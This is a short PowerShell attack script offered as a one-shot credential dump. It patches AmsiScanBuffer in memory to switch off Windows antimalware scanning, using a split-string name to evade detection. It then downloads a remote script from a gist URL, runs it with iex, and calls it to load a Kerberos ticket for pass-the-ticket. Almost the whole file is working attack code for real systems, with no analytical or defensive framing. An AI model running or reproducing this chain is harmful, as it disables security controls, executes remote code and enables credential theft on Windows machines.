# @author Pichaya Morimoto (p.morimoto@sth.sh)
# One Shot for M1m1katz PowerShell Dump All Creds with AMSI Bypass 2022 Edition
# (Tested and worked on Windows 10 x64 patched 2022-03-26)
# Changeg just the last command
# Usage:
# 1. You need a local admin user's powershell with Medium Mandatory Level (whoami /all)
# 2. 
# 
# Copied from payatu's AMSI-Bypass (23-August-2021)
# https://payatu.com/blog/arun.nair/amsi-bypass
$code = @"
using System;
using System.Runtime.InteropServices;
public class WinApi {
	
	[DllImport("kernel32")]
	public static extern IntPtr LoadLibrary(string name);
	
	[DllImport("kernel32")]
	public static extern IntPtr GetProcAddress(IntPtr hModule, string procName);
	
	[DllImport("kernel32")]
	public static extern bool VirtualProtect(IntPtr lpAddress, UIntPtr dwSize, uint flNewProtect, out int lpflOldProtect);
	
}
"@

Add-Type $code

$amsiDll = [WinApi]::LoadLibrary("amsi.dll")
$asbAddr = [WinApi]::GetProcAddress($amsiDll, "Ams"+"iScan"+"Buf"+"fer")
$ret = [Byte[]] ( 0xc3, 0x80, 0x07, 0x00,0x57, 0xb8 )
$out = 0

[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, 0x40, [ref] $out)
[System.Runtime.InteropServices.Marshal]::Copy($ret, 0, $asbAddr, $ret.Length)
[WinApi]::VirtualProtect($asbAddr, [uint32]$ret.Length, $out, [ref] $null)


# nishang - 2.2.0 (Jul 24, 2021)
# Change this to "attacker-ip" for internal sources
wget('https://gist.githubusercontent.com/pich4ya/144d32262861b573279d15e653c4e08d/raw/6f019c4e2f1f62ffc0754d01dff745d3cec62057/Invoke-SoHighSoHigh.ps1') -UseBasicParsing|iex
Invoke-SoHighSoHigh -Command '"kerberos::ptt c:\Users\attacker\ticket.kirbi"'
